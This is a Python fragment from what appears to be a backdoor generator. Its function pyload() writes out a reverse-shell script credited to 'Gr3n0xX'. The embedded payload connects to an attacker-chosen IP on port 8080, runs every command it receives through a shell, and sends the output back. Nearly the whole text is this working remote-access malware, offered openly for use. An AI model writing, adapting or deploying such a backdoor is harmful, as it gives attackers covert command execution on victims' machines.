

def pyload():
    print("[*] Insert a file name.py")
    arq = open(file_name, 'w')
    finish()
    temp = """
# Backdoor coded by: Gr3n0xX
# Python 3.9

import socket
import subprocess
import os
import sys

LHOST = '""" + ip + """' 
LPORT = 8080
client = socket.socket()
print("[-] Connection Initiating...")

try:
    client.connect((LHOST, LPORT))
    print("[-] Connection initiated!")
    
except ConnectionAbortedError:
    os.system("clear")
    print("[!] Connection aborted, check IpAddres or see if the port you selected is open...")
    sys.exit()
    
except ConnectionRefusedError:
    os.system("clear")
    print("[!] Connection refused, check IpAddres or see if the port you selected is open...")
    sys.exit()
    
except TimeoutError:
    os.system("clear")
    print("[!] Connection refused")
    sys.exit()

except KeyboardInterrupt:
    os.system("clear")
    print("[!] Shutdown")
    sys.exit()

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
    """
    arq.write(temp + "\n")
